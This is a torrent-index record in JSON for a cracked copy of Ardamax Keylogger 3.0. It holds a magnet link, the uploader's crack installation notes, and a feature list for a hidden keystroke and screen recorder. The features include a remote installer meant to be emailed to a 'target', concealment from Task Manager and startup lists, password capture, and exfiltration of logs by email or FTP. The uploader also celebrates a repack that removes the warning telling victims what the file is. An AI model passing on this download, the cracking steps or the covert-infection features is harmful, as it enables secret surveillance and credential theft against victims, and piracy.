{"title":"Ardamax.Keylogger.3.0.REAL.REPACK.Cracked-ONY","uid":4345558,"size":1438992,"categoryP":"applications","categoryS":"windows","magnet":"?xt=urn:btih:d8656a2a2f0db8ba2a3bb5db2093fc5c422411e2&amp;dn=Ardamax.Keylogger.3.0.REAL.REPACK.Cracked-ONY&amp;tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&amp;tr=udp%3A%2F%2Fopen.demonii.com%3A1337&amp;tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&amp;tr=udp%3A%2F%2Fexodus.desync.com%3A6969","seeders":1,"leechers":0,"uploader":"ony","files":2,"time":1218847153,"description":"APPLICATION : Ardamax Keylogger 3.0 REAL REPACK *CRACKED*\n         OS : Win\n       TYPE : Keylogger\n        WWW : http://www.ardamax.com/keylogger/\n    RELDATE : 02/08/2008\n PROTECTION : aspr\n CRKRELDATE : 16/08/2008\n\nINSTALLATION: Install.\n              Copy .exe in crack dir. to install dir.\n              Copy .003 in crack dir. to install dir.\n\n       NOTES: You know what you have here. A KEYLOGGER!\n              YOUR AV WILL PROBABLY DETECT IT! HOOORAY!\n              \n              STOP WHINING ABOUT IT...            \n              \nREPACK NOTES: SORRY for the fuckup&amp;#039;s, twice! You never think clear tired.\n\n              First release had issues with disabled &quot;Remote Install&quot;.\n              \n              Second release fixed that, but had problems to validate/\n              create remote package properly and if built, it had a\n              NAG warning that it contained ardamax keylogger. bad huh?!\n              \n              Well to make an end to this sad story.\n              Shit works now and I think we all need some rest...\n              \n              Enjoy! /ONY \n\nABOUT:\n\nArdamax Keylogger - invisible keystroke recorder with remote installation.  \t\n\nArdamax Keylogger is a keystroke recorder that captures user&amp;#039;s activity and\nsaves it to an encrypted log file. The log file can be viewed with the powerful\nLog Viewer. Use this tool to find out what is happening on your computer while\nyou are away, maintain a backup of your typed data automatically or use it to\nmonitor your kids. Also you can use it as a monitoring device for detecting\nunauthorised access. Logs can be automatically sent to your e-mail address,\naccess to the keylogger is password protected. Besides, Ardamax Keylogger logs\ninformation about the Internet addresses the user has visited.\n\nThis invisible spy application is designed for Windows 98,ME,NT4,2000,XP &amp; 2003.\n\n \n\nKeylogger Features:\n\n    * Remote Installer - creates a customized Ardamax Keylogger engine file.\n      You can email this file to your target for remote monitoring.\n\n    * Invisible mode makes it absolutely invisible to anyone. Ardamax Keylogger\n      is not visible in the task bar, system tray, Windows 98/2000/XP/2003/Vista\n      Task Manager, process viewers (Process Explorer, WinTasks etc.), Start Menu\n      and Windows Startup list.\n\n    * Email log delivery - keylogger can send you recorded logs through e-mail\n      delivery at set times - perfect for remote monitoring!\n\n    * FTP delivery - Ardamax Keylogger can upload recorded logs through FTP.\n\n    * Network delivery - sends recorded logs through via LAN.\n\n    * Clipboard logging - capture all text copied to the Windows Clipboard.\n\n    * Visual surveillance - periodically makes screenshots and stores the\n      compressed images to log.\n\n    * Chat monitoring - Ardamax Keylogger is designed to record and monitor both\n      sides of a conversation in following chats:\n\n    o MSN Messenger, Windows Live Messenger\n    o ICQ Pro, ICQ Lite\n    o Skype\n    o Windows Messenger\n    o Google Talk\n    o Yahoo Messenger\n    o Miranda\n    o QiP\n\n    * Security - allows you to protect program settings, Hidden Mode\n      and Log file.\n\n    * Web Update - Ardamax Keylogger can check the availability of updates,\n      download and install them automatically. Thus, the latest version of\n      Ardamax Keylogger will always be installed on your computer.\n\n    * Application monitoring - keylogger will record the application that was\n      in use that received the keystroke!\n\n    * Time/Date tracking - it allows you to pinpoint the exact time a window\n      received a keystroke!\n\n    * Powerful Log Viewer - you can view and save the log as a HTML page or\n      plain text with keylogger Log Viewer.\n\n    * Small size ÃƒÂ» Ardamax Keylogger is several times smaller than other\n      programs with the same features. It has no additional modules and\n      libraries, so its size is smaller and the performance is higher.\n\n    * Ardamax Keylogger fully supports Unicode characters which makes it possible\n      to record keystrokes that include characters from Japanese, Chinese, Arabic\n      and many other character sets.\n\n    * It records every keystroke. Captures passwords and all other invisible\n      text.\n\n      Other Features:\n\n    * Windows 2000/XP/Vista support\n    * Monitors multi-user machines\n    * Automatic startup\n    * Friendly interface\n    * Easy to install","torrent":{"xt":"urn:btih:d8656a2a2f0db8ba2a3bb5db2093fc5c422411e2","amp;dn":"Ardamax.Keylogger.3.0.REAL.REPACK.Cracked-ONY","amp;tr":["udp%3A%2F%2Ftracker.openbittorrent.com%3A80","udp%3A%2F%2Fopen.demonii.com%3A1337","udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969","udp%3A%2F%2Fexodus.desync.com%3A6969"],"infoHash":"d8656a2a2f0db8ba2a3bb5db2093fc5c422411e2","infoHashBuffer":{"type":"Buffer","data":[216,101,106,42,47,13,184,186,42,59,181,219,32,147,252,92,66,36,17,226]},"announce":[],"urlList":[]}}